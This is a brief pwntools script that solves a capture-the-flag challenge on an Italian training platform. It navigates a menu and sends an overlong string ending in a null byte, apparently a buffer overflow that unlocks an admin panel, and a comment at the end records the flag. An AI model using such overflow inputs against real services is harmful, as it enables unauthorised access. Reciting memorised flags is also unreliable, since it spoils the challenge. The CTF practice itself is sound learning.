#! /usr/bin/env python3

from pwn import *

conn = remote('accesso.challs.olicyber.it',10103)
conn.recvuntil('Chiudi\n> ')
conn.sendline('1')
conn.recvuntil('> ')
conn.sendline('1')
conn.recvuntil('> ')# aaaaaaaaaaaaaaaaaaaaaaa
conn.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00")
conn.sendline('1')
conn.interactive()


# flag{bof_b0f_4dm1n_pan3l_r34dy_t0_g0}
